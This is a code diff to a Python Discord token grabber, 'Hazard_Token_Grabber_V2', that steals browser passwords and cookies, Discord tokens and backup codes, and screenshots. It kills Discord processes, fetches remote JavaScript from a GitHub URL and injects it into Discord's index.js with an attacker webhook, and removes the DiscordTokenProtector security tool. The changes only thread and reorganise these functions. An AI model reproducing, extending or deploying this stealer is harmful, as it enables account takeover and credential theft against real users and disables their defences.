@@ -8,6 +8,7 @@ import base64
 import psutil
 import winreg
 
+from threading import Thread
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from re import findall
@@ -41,9 +42,12 @@ class Hazard_Token_Grabber_V2:
         else:
             self.grabPassword()
             self.grabCookies()
+        t = Thread(target=self.screenshot)
+        t2 = Thread(target=self.killDiscord)
+        t.start();t.join()
+        t2.start();t2.join()
         self.grabTokens()
         self.neatifyTokens()
-        self.screenshot()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
                 with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
@@ -78,20 +82,16 @@ class Hazard_Token_Grabber_V2:
         return headers
 
     def Injection(self):
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in\
-            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
-                try:
-                    proc.kill()
-                except psutil.NoSuchProcess:
-                    pass
         for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
                     except FileNotFoundError:
+                        pass
+                    try:
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                    except FileExistsError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
@@ -101,10 +101,7 @@ class Hazard_Token_Grabber_V2:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
-    def bypassTokenProtector(self):
-        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
-        config = tp+"config.json"
+    def killDiscord(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
@@ -112,6 +109,11 @@ class Hazard_Token_Grabber_V2:
                     proc.kill()
                 except psutil.NoSuchProcess:
                     pass
+
+    def bypassTokenProtector(self):
+        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        config = tp+"config.json"
         for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
             try:
                 os.remove(tp+i)
